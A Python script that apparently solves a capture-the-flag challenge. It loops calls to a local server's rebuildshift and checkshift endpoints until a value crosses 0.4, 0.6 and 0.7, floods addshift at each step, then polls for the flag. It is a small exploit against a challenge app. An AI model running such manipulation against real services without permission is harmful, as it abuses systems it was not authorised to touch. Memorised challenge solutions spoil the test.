import requests

r2 = requests.get("http://127.0.0.1:5000/resetshift")

for i in range(0,100):
  r1 = requests.get("http://127.0.0.1:5000/rebuildshift")
  r2 = requests.get("http://127.0.0.1:5000/checkshift")
  val = r2.text[:].split("[[")[1].split("]]")[0]
  print(val)
  if(float(val) > 0.4):
    print("Sucessfully broke .4")
    print(val)
    for j in range(0,15):
      requests.get("http://127.0.0.1:5000/addshift")
    break

for i in range(0,100):
  r1 = requests.get("http://127.0.0.1:5000/rebuildshift")
  r2 = requests.get("http://127.0.0.1:5000/checkshift")
  val = r2.text[:].split("[[")[1].split("]]")[0]
  print(val)
  if(float(val) > 0.6):
    print("Sucessfully broke .6")
    print(val)
    for j in range(0,30):
      requests.get("http://127.0.0.1:5000/addshift")
    break


for i in range(0,100):
  r1 = requests.get("http://127.0.0.1:5000/rebuildshift")
  r2 = requests.get("http://127.0.0.1:5000/checkshift")
  val = r2.text[:].split("[[")[1].split("]]")[0]
  print(val)
  if(float(val) > 0.7):
    print("Sucessfully broke .7")
    print(val)
    for j in range(0,60):
      requests.get("http://127.0.0.1:5000/addshift")
    break

for i in range(0,100):
  r1 = requests.get("http://127.0.0.1:5000/rebuildshift")
  r2 = requests.get("http://127.0.0.1:5000/checkshift")
  if("flag" in r2.text):
    print(r2.text)